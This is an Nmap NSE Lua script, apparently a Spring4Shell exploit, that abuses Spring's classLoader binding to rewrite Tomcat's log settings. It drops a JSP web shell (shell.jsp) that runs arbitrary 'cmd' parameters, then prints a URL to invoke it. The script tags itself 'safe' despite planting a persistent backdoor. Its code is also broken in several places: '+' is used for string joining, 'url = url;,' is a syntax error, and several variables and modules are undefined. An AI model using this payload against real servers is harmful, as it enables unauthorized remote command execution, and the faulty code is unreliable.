# nmap-spring4shell

local https = require('ssl.https')
local stdnse = require "stdnse"

description = [[
]]

---
-- @usage
-- 
-- @output
--
-- @args
--
---

author = "Grzegorz Piechnik"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"default", "vuln", "safe", "spring4shell"}

portrule = shortport.http

local function wait (s)
  local timer = io.popen("sleep " .. s)
  timer:close()
end

action = function(url, port)

  local post_headers = {
    ["content-type"] = "application/x-www-form-urlencoded"
  }

  local get_headers = {
      ["prefix"] = "<%",
      ["suffix"] = "%>//",
      ["c"] = "Runtime"
  }

  local log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
  local log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
  local log_file_dir = "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
  local log_file_prefix = "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell"
  local log_file_date_format  = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
  local file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"

  local payload = log_pattern + log_file_suffix + log_file_dir + log_file_prefix + log_file_date_format
  local url = stdnse.get_script_args('nse-spring4shell.url')
  local port = stdnse.get_script_args('nse-spring4shell.port') or "80"

	if ( not(url) ) then
    return "\n  ERROR: No url was specified (see nse-spring4shell.url)"
	end

  -- first POST request
  local result, respcode, respheaders, respstatus = https.request {
    method = "POST",
    url = url;,
    source = ltn12.source.string(file_date_data),
    headers = post_headers,
    sink = ltn12.sink.table(respbody)
  }

  -- change the tomcat log location variables
  local result, respcode, respheaders, respstatus = https.request {
    method = "POST",
    url = url;,
    source = ltn12.source.string(payload),
    headers = post_headers,
    sink = ltn12.sink.table(respbody)
  }

  wait(3)

  -- write the web shell
  local result, respcode, respheaders, respstatus = https.request {
    method = "GET",
    url = url;,
    headers = get_headers,
    sink = ltn12.sink.table(respbody)
  }

  if respcode~=200 then 
    return "\n  ERROR: Not valid status code".. (code or '')
  end

  wait(1)

  -- reset the pattern
  local pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="

  local result, respcode, respheaders, respstatus = https.request {
    method = "POST",
    url = url;,
    source = ltn12.source.string(pattern_data),
    headers = post_headers,
    sink = ltn12.sink.table(respbody)
  }

  respbody = table.concat(respbody)

  -- verify that RCE is working on the server. We will check it with 3 commands: ls
  print("https://", url, "/", "shell.jsp?cmd=id")

end


